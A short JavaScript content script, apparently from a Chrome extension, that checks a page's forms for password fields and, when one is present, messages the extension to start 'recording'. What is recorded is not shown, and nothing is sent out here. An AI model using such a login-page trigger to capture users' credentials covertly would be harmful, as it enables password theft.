check_forms();


function check_forms(){
	var forms=document.forms,
		has_password=false;

	finding:
	for(var i=0;i<forms.length;i++){
		var form=forms[i],
			inputs=form.getElementsByTagName("input");

		for(var j=0;j<inputs.length;j++){
			var input=inputs[j];
			if(input.type=="password"){
				has_password=true;
				break finding;
			}
		}
	}
	if(has_password){
		start_recording();
	}
	else
		console.log("no passwords");
}

function start_recording(){
	chrome.runtime.sendMessage({action: "record"}, function(response) {
		// console.log(response.farewell);
	});
}